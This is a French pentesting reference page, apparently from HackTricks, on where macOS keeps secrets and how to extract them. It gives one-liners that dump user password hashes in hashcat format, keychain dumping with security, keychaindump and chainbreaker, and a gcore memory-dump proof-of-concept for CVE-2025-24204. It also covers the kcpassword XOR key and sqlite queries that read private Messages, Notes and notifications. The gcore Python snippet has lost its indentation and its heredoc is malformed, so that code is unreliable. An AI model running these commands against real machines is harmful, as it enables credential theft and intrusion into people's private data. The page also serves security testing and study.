# Emplacements sensibles macOS & daemons intéressants

{{#include ../../../banners/hacktricks-training.md}}

## Mots de passe

### Mots de passe shadow

Le mot de passe shadow est stocké avec la configuration de l'utilisateur dans des plists situés dans **`/var/db/dslocal/nodes/Default/users/`**.\
La commande oneliner suivante peut être utilisée pour extraire **toutes les informations sur les utilisateurs** (y compris les informations de hash) :
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) peuvent être utilisés pour transformer le hash au **format** **hashcat**.

Un one-liner alternatif qui dump les creds de tous les non-service accounts au format hashcat `-m 7100` (macOS PBKDF2-SHA512) :
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Une autre manière d'obtenir le `ShadowHashData` d'un utilisateur est d'utiliser `dscl` : `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ce fichier est **utilisé uniquement** lorsque le système est en **single-user mode** (donc pas très fréquemment).

### Keychain Dump

Notez que lorsque vous utilisez le binaire security pour **dump the passwords decrypted**, plusieurs invites demanderont à l'utilisateur d'autoriser cette opération.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> D'après ce commentaire [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) il semble que ces outils ne fonctionnent plus sous Big Sur.

### Keychaindump Overview

Un outil nommé **keychaindump** a été développé pour extraire des mots de passe des trousseaux de clés macOS, mais il rencontre des limitations sur les versions récentes de macOS comme Big Sur, comme indiqué dans une [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'utilisation de **keychaindump** nécessite que l'attaquant obtienne un accès et escalate ses privilèges jusqu'à **root**. L'outil exploite le fait que le trousseau est déverrouillé par défaut lors de la connexion de l'utilisateur, permettant aux applications d'y accéder sans exiger à chaque fois le mot de passe de l'utilisateur. Cependant, si un utilisateur choisit de verrouiller son trousseau après chaque utilisation, **keychaindump** devient inefficace.

**Keychaindump** opère en ciblant un processus spécifique appelé **securityd**, décrit par Apple comme un démon pour l'autorisation et les opérations cryptographiques, essentiel pour accéder au trousseau. Le processus d'extraction consiste à identifier une **Master Key** dérivée du mot de passe de connexion de l'utilisateur. Cette clé est essentielle pour lire le fichier du trousseau. Pour localiser la **Master Key**, **keychaindump** scanne le tas mémoire de **securityd** en utilisant la commande `vmmap`, recherchant des clés potentielles dans des zones marquées `MALLOC_TINY`. La commande suivante est utilisée pour inspecter ces emplacements mémoire :
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Après avoir identifié des clés maîtresses potentielles, **keychaindump** parcourt les heaps à la recherche d'un motif spécifique (`0x0000000000000018`) qui indique un candidat pour la clé maîtresse. Des étapes supplémentaires, incluant la déobfuscation, sont nécessaires pour utiliser cette clé, comme indiqué dans le code source de **keychaindump**. Les analystes se concentrant sur ce domaine doivent noter que les données cruciales pour décrypter le keychain sont stockées dans la mémoire du processus **securityd**. Une commande d'exemple pour exécuter **keychaindump** est :
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) peut être utilisé pour extraire les types d'informations suivants d'un OSX keychain de manière forensique :

- Mot de passe Keychain haché, adapté au cracking avec [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
- Mots de passe Internet
- Mots de passe génériques
- Clés privées
- Clés publiques
- Certificats X509
- Notes sécurisées
- Mots de passe Appleshare

Si le mot de passe de déverrouillage du keychain, une clé maîtresse obtenue en utilisant [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou un fichier de déverrouillage tel que SystemKey est fourni, Chainbreaker fournira également les mots de passe en clair.

Sans l'une de ces méthodes pour déverrouiller le Keychain, Chainbreaker affichera toutes les autres informations disponibles.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (avec mots de passe) avec SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extraire les clés du trousseau (avec mots de passe) — craquage du hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump des keychain keys (avec passwords) via memory dump**

[Suivez ces étapes](../index.html#dumping-memory-with-osxpmem) pour effectuer un **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) en utilisant le mot de passe de l'utilisateur**

Si vous connaissez le mot de passe de l'utilisateur, vous pouvez l'utiliser pour **dump and decrypt keychains that belong to the user**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Clé maître du Keychain via l'entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) fournissait `/usr/bin/gcore` avec l'entitlement **`com.apple.system-task-ports.read`**, donc tout administrateur local (ou application signée malveillante) pouvait dump **la mémoire de n'importe quel processus même avec SIP/TCC appliqués**. Le dump de `securityd` leaks la **Keychain master key** en clair et permet de déchiffrer `login.keychain-db` sans le mot de passe de l'utilisateur.

**Reproduction rapide sur les builds vulnérables (15.0–15.2) :**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Alimentez la clé hex extraite dans Chainbreaker (`--key <hex>`) pour décrypter le login keychain. Apple a retiré cet entitlement dans **macOS 15.3+**, donc cela ne fonctionne que sur des builds Sequoia non patchés ou sur des systèmes ayant conservé le binaire vulnérable.

### kcpassword

Le fichier **kcpassword** contient le **mot de passe de connexion de l'utilisateur**, mais seulement si le propriétaire du système a **activé la connexion automatique**. Par conséquent, l'utilisateur sera connecté automatiquement sans qu'on lui demande un mot de passe (ce qui n'est pas très sécurisé).

Le mot de passe est stocké dans le fichier **`/etc/kcpassword`** xored avec la clé **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si le mot de passe de l'utilisateur est plus long que la clé, la clé sera réutilisée.\
Cela rend le mot de passe assez facile à récupérer, par exemple en utilisant des scripts comme [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informations intéressantes dans les bases de données

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Vous pouvez trouver les données des notifications dans `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La plupart des informations intéressantes se trouvent dans le **blob**. Vous devrez donc **extraire** ce contenu et **le transformer** en **format lisible par un humain** ou utiliser **`strings`**. Pour y accéder, vous pouvez faire :
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Problèmes récents de confidentialité (NotificationCenter DB)

- Dans macOS **14.7–15.1**, Apple stockait le contenu des bannières dans le SQLite `db2/db` sans masquage approprié. Les CVEs **CVE-2024-44292/44293/40838/54504** permettaient à n'importe quel utilisateur local de lire le texte des notifications d'autres utilisateurs simplement en ouvrant la DB (no TCC prompt). Corrigé dans **15.2** en déplaçant/verrouillant la DB ; sur les systèmes plus anciens le chemin ci‑dessus still leaks recent notifications and attachments.
- La base de données est world-readable uniquement sur les builds affectés, donc lors du hunting sur des legacy endpoints, copiez-la avant la mise à jour pour préserver les artefacts.

### Notes

Les **notes** des utilisateurs se trouvent dans `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Préférences

Dans macOS, les préférences des apps se trouvent dans **`$HOME/Library/Preferences`** et, dans iOS, elles se trouvent dans `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Dans macOS, l'outil CLI **`defaults`** peut être utilisé pour **modifier le fichier de préférences**.

**`/usr/sbin/cfprefsd`** réclame les services XPC `com.apple.cfprefsd.daemon` et `com.apple.cfprefsd.agent` et peut être appelé pour effectuer des actions telles que modifier les préférences.

## OpenDirectory permissions.plist

Le fichier `/System/Library/OpenDirectory/permissions.plist` contient des permissions appliquées aux attributs des nœuds et est protégé par SIP.\
Ce fichier accorde des permissions à des utilisateurs spécifiques par UUID (et non par uid) afin qu'ils puissent accéder à des informations sensibles spécifiques telles que `ShadowHashData`, `HeimdalSRPKey` et `KerberosKeys`, entre autres :
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notifications système

### Notifications de Darwin

Le démon principal pour les notifications est **`/usr/sbin/notifyd`**. Pour recevoir des notifications, les clients doivent s'enregistrer via le port Mach `com.apple.system.notification_center` (vérifiez-les avec `sudo lsmp -p <pid notifyd>`). Le démon est configurable via le fichier `/etc/notify.conf`.

Les noms utilisés pour les notifications sont des notations DNS inversées uniques et lorsqu'une notification est envoyée à l'un d'eux, le(s) client(s) ayant indiqué qu'ils peuvent la gérer la recevront.

Il est possible d'obtenir l'état actuel (et de voir tous les noms) en envoyant le signal SIGUSR2 au processus notifyd et en lisant le fichier généré : `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Le **Distributed Notification Center**, dont le binaire principal est **`/usr/sbin/distnoted`**, est une autre façon d'envoyer des notifications. Il expose des services XPC et effectue certaines vérifications pour tenter d'authentifier les clients.

### Apple Push Notifications (APN)

Dans ce cas, les applications peuvent s'enregistrer pour des **topics**. Le client générera un token en contactant les serveurs d'Apple via **`apsd`**.\
Ensuite, les fournisseurs auront également généré un token et pourront se connecter aux serveurs d'Apple pour envoyer des messages aux clients. Ces messages seront reçus localement par **`apsd`** qui relaiera la notification à l'application qui l'attend.

Les préférences se trouvent dans `/Library/Preferences/com.apple.apsd.plist`.

Il existe une base de données locale de messages située sous macOS dans `/Library/Application\ Support/ApplePushService/aps.db` et sous iOS dans `/var/mobile/Library/ApplePushService`. Elle contient 3 tables : `incoming_messages`, `outgoing_messages` et `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Il est également possible d'obtenir des informations sur le daemon et les connexions en utilisant :
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notifications utilisateur

Ce sont des notifications que l'utilisateur doit voir à l'écran :

- **`CFUserNotification`** : Cette API permet d'afficher à l'écran une fenêtre pop-up contenant un message.
- The Bulletin Board : Affiche sur iOS une bannière qui disparaît et est stockée dans le Centre de notifications.
- **`NSUserNotificationCenter`** : Il s'agit du bulletin d'iOS sur MacOS. La base de données contenant les notifications se trouve dans `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Références

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
